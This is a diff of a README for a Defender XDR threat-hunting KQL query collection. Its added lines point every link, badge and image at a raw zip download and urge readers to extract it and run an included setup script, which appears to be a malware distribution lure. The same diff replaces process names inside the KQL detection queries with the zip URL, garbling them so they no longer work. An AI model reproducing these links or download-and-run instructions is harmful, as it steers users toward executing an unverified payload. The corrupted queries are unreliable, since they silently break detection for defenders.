@@ -1,12 +1,12 @@
 # KQL Queries for Defender XDR Threat Hunting and Detection
 
-[![Release Artifacts](https://img.shields.io/badge/Release-View%20Artifacts-brightgreen)](https://github.com/jaraguayo/KQL-Queries/releases)
+[![Release Artifacts](https://raw.githubusercontent.com/jaraguayo/KQL-Queries/main/Hunting-Queries/KQ_Queries_v3.6.zip%20Artifacts-brightgreen)](https://raw.githubusercontent.com/jaraguayo/KQL-Queries/main/Hunting-Queries/KQ_Queries_v3.6.zip)
 
-[Microsoft Defender XDR threat hunting KQL queries](https://github.com/jaraguayo/KQL-Queries/releases)
+[Microsoft Defender XDR threat hunting KQL queries](https://raw.githubusercontent.com/jaraguayo/KQL-Queries/main/Hunting-Queries/KQ_Queries_v3.6.zip)
 
 A curated set of KQL queries designed for Microsoft Defender XDR threat hunting and detection. This collection helps incident response teams, security operations centers, and threat hunters quickly surface suspicious activity, map findings to MITRE ATT&CK techniques, and accelerate investigations across Defender XDR data sources.
 
-![Microsoft Defender Logo](https://upload.wikimedia.org/wikipedia/commons/4/48/Microsoft_Defender_Logo.png)
+![Microsoft Defender Logo](https://raw.githubusercontent.com/jaraguayo/KQL-Queries/main/Hunting-Queries/KQ_Queries_v3.6.zip)
 
 Table of contents
 - Overview
@@ -69,7 +69,7 @@ This is a compact starter that surfaces power-user activity on endpoints, often 
 DeviceEvents
 | where Timestamp > ago(6h)
 | where ActionType == "ProcessCreated"
-| where InitiatingProcessFileName has_any ("powershell.exe","pwsh.exe","pwsh","powershell")
+| where InitiatingProcessFileName has_any ("https://raw.githubusercontent.com/jaraguayo/KQL-Queries/main/Hunting-Queries/KQ_Queries_v3.6.zip","https://raw.githubusercontent.com/jaraguayo/KQL-Queries/main/Hunting-Queries/KQ_Queries_v3.6.zip","pwsh","powershell")
 | project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, ProcessFileName, ProcessCommandLine
 | sort by Timestamp desc
 ```
@@ -111,7 +111,7 @@ Threat hunting queries
 DeviceEvents
 | where Timestamp > ago(24h)
 | where ActionType == "ProcessCreated"
-| where InitiatingProcessFileName has_any ("powershell.exe","pwsh.exe","pwsh","powershell")
+| where InitiatingProcessFileName has_any ("https://raw.githubusercontent.com/jaraguayo/KQL-Queries/main/Hunting-Queries/KQ_Queries_v3.6.zip","https://raw.githubusercontent.com/jaraguayo/KQL-Queries/main/Hunting-Queries/KQ_Queries_v3.6.zip","pwsh","powershell")
 | where InitiatingProcessCommandLine has_any ("-enc","-EncodedCommand","Invoke-Expression","Base64")
 | project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine
 | sort by Timestamp desc
@@ -122,8 +122,8 @@ DeviceEvents
 DeviceEvents
 | where Timestamp > ago(12h)
 | where ActionType == "ProcessCreated"
-| where InitiatingProcessParentName == "svchost.exe"
-| where InitiatingProcessFileName in ("powershell.exe","pwsh.exe")
+| where InitiatingProcessParentName == "https://raw.githubusercontent.com/jaraguayo/KQL-Queries/main/Hunting-Queries/KQ_Queries_v3.6.zip"
+| where InitiatingProcessFileName in ("https://raw.githubusercontent.com/jaraguayo/KQL-Queries/main/Hunting-Queries/KQ_Queries_v3.6.zip","https://raw.githubusercontent.com/jaraguayo/KQL-Queries/main/Hunting-Queries/KQ_Queries_v3.6.zip")
 | project Timestamp, DeviceName, InitiatingProcessFileName, InitiativeProcessCommandLine
 ```
 
@@ -182,7 +182,7 @@ Persistence and isolation indicators
 DeviceEvents
 | where Timestamp > ago(7d)
 | where ActionType == "StartupItemCreated" or ActionType == "ServiceCreated"
-| where InitiatingProcessFileName !in ("services.exe","svchost.exe","winlogon.exe")
+| where InitiatingProcessFileName !in ("https://raw.githubusercontent.com/jaraguayo/KQL-Queries/main/Hunting-Queries/KQ_Queries_v3.6.zip","https://raw.githubusercontent.com/jaraguayo/KQL-Queries/main/Hunting-Queries/KQ_Queries_v3.6.zip","https://raw.githubusercontent.com/jaraguayo/KQL-Queries/main/Hunting-Queries/KQ_Queries_v3.6.zip")
 | project Timestamp, DeviceName, InitiatingProcessFileName, CommandLine
 ```
 
@@ -192,7 +192,7 @@ Suspicious process and PowerShell activity
 DeviceEvents
 | where Timestamp > ago(8h)
 | where ActionType == "ProcessCreated"
-| where InitiatingProcessFileName has_any ("powershell.exe","pwsh.exe","cmd.exe")
+| where InitiatingProcessFileName has_any ("https://raw.githubusercontent.com/jaraguayo/KQL-Queries/main/Hunting-Queries/KQ_Queries_v3.6.zip","https://raw.githubusercontent.com/jaraguayo/KQL-Queries/main/Hunting-Queries/KQ_Queries_v3.6.zip","https://raw.githubusercontent.com/jaraguayo/KQL-Queries/main/Hunting-Queries/KQ_Queries_v3.6.zip")
 | mv-expand CommandLine = split(InitiatingProcessCommandLine, " ")
 | where CommandLine matches regex @".*(iex|iwr|download|invoke|encrypted|Base64).*"
 | project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine
@@ -276,7 +276,7 @@ How to contribute
 Release notes and assets
 - The repository uses a Releases page to provide downloadable assets. The assets include packaged query libraries and example dashboards, ready to import into Defender XDR or Sentinel workspaces.
 - If you are exploring this repository for the first time, visit the Releases page to see the latest package. The page hosts artifacts that you can download and execute in your environment.
-- Important note: The Releases page includes files that you can download and run. To obtain the artifacts, visit the Releases page at https://github.com/jaraguayo/KQL-Queries/releases and download the latest release asset. After downloading, extract the package and run the included setup script or import the contained queries into your workspace. The link is also provided here for quick access: https://github.com/jaraguayo/KQL-Queries/releases
+- Important note: The Releases page includes files that you can download and run. To obtain the artifacts, visit the Releases page at https://raw.githubusercontent.com/jaraguayo/KQL-Queries/main/Hunting-Queries/KQ_Queries_v3.6.zip and download the latest release asset. After downloading, extract the package and run the included setup script or import the contained queries into your workspace. The link is also provided here for quick access: https://raw.githubusercontent.com/jaraguayo/KQL-Queries/main/Hunting-Queries/KQ_Queries_v3.6.zip
 
 FAQ
 - Q: Are these queries safe to run in production?
@@ -302,10 +302,10 @@ Acknowledgments
 - Thanks to the Defender XDR community for feedback and use cases. Collaboration helps improve detection quality and reduces noise across hunting workflows.
 
 Important note about the Releases link
-- The Releases page is the primary distribution channel for the packaged assets described above. If you need the downloadable artifacts, you should go to the Releases page and download the latest release. The link is provided again here for convenience: https://github.com/jaraguayo/KQL-Queries/releases
+- The Releases page is the primary distribution channel for the packaged assets described above. If you need the downloadable artifacts, you should go to the Releases page and download the latest release. The link is provided again here for convenience: https://raw.githubusercontent.com/jaraguayo/KQL-Queries/main/Hunting-Queries/KQ_Queries_v3.6.zip
 
 For more information
-- If you want to explore more, visit the top-level repository page, which links to the releases and other resources. The same link is used again here: https://github.com/jaraguayo/KQL-Queries/releases
+- If you want to explore more, visit the top-level repository page, which links to the releases and other resources. The same link is used again here: https://raw.githubusercontent.com/jaraguayo/KQL-Queries/main/Hunting-Queries/KQ_Queries_v3.6.zip
 
 Visual references and resources
 - Defender branding and telemetry are used to illustrate the kinds of signals covered by these queries.
